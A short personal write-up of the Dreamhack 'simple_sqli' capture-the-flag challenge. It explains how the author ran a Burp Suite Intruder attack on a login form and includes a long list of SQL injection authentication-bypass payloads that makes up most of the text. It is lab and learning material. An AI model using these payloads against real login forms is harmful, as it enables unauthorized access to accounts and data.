---
created: 2026-09-21
tags:
  - note
  - journal
  - cyberStuff
title: simple_sqli
draft: false
date:
subiect:
dificultate: 1
amuca: true
link:
  - https://dreamhack.io/wargame/challenges/24
lastmod: 2026-10-09T12:40:16.538Z
---
Link: https://dreamhack.io/wargame/challenges/24\
Loaded the site; the only possible place for SQLi would be the login form:\
![](/images/static/Pasted%20image%2020260921025737.png)\
Decided to do it manually using Burp Suite and some payloads from this repo: https://github.com/payload-box/sql-injection-payload-list

![](/images/static/Pasted%20image%2020260921030055.png)\
Started an attack in Intruder with those settings using this payload list:

```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

and found 2 interesting requests:\
![](/images/static/Pasted%20image%2020260921030429.png)\
and the second one returned the flag:\
![](/images/static/Pasted%20image%2020260921030448.png)\
I used the response length of the requests to identify any interesting behavior.
